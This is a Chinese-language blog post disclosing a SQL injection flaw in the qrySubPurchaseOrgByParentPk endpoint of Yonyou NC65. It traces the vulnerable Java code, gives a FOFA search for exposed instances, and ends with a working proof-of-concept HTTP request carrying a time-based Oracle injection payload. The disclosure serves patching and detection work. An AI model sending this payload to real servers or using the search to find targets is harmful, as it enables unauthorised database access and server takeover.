# 用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞

- Mrxn
- 发表于2025/6/12 08:25
- 42浏览
- [0评论](https://mrxn.net/jswz/yonyou-nc-ebvp-register-qrySubPurchaseOrgByParentPk-sqli.html#comment)
- 25分钟阅读
- 

------

# 漏洞简介

[用友](https://mrxn.net/tag/用友)NC 是一种商业级的企业资源规划，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC电子商务平台的 `qrySubPurchaseOrgByParentPk` 接口存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

# 影响版本

NC65

# fofa语法

> ```
> app="用友-UFIDA-NC"
> ```

# 漏洞分析

直接看 `RegCommonController` 对应的 `doQuerySubPurchaseOrgByParentPk` 方法实现部分

```java
public Object doQuerySubPurchaseOrgByParentPk(HttpServletRequest request, HttpServletResponse response) {
        String pkGroup = request.getParameter("pk_group");
        String strOrgFilter = request.getParameter("org_filter");
        List<OrgVO> orgList = null;
        List<OrgPOJO> orgPojoList = new ArrayList();

        try {
            orgList = this.getSRMRegisterQueryService().queryRegisterOrgsFilterByName(pkGroup, strOrgFilter);
            if (orgList == null || orgList.size() == 0) {
                return orgPojoList;
            }
```

用户可控参数 `pk_group` 未经任何处理或校验过滤就直接带入 `queryRegisterOrgsFilterByName` 方法

```java
public List<OrgVO> queryRegisterOrgsFilterByName(String pkGroup, String filterName) throws BusinessException {
        List<OrgVO> retVoList = new ArrayList();
        Map<String, RegisterOrgVO> pkOrgMap = this.queryRegisterOrgs(pkGroup);
        if (pkOrgMap != null && pkOrgMap.size() != 0) {
            Set<String> keySet = pkOrgMap.keySet();
```

又被带入 `queryRegisterOrgs` 方法，跟进

```java
public Map<String, RegisterOrgVO> queryRegisterOrgs(String pk_group) throws BusinessException {
        if (pk_group != null && !pk_group.isEmpty()) {
            Map<String, RegisterOrgVO> registerOrgs = new HashMap();
            SqlBuilder sql = new SqlBuilder();
            sql.append(" and ");
            sql.append("pk_group", pk_group);
            sql.append(" and ");
            sql.append("cregisterorgid", " != ", pk_group);
            sql.append(" and ");
            sql.append("enablestate", 2);
            RegisterOrgVO[] vos = null;

            try {
                VOQuery<RegisterOrgVO> query = new VOQuery(RegisterOrgVO.class);
                vos = (RegisterOrgVO[])query.query(sql.toString(), (String)null);
```

很明显的直接将参数拼接进sql语句中，造成[SQL注入漏洞](https://mrxn.net/tag/SQL注入)。

而权限校验部分可以参考 [用友NC pkevalset SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-evalschedule-pkevalset-sqli.html) 部分

[![用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞](https://img.mrxn.net/519dfcacc3ce40d7960ec19110f97b71.webp)](https://img.mrxn.net/519dfcacc3ce40d7960ec19110f97b71.webp)

# 漏洞复现

```http
POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
Host: nc65.mrxn.net
Content-Type: application/x-www-form-urlencoded

pk_group=1' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('any',3)--
```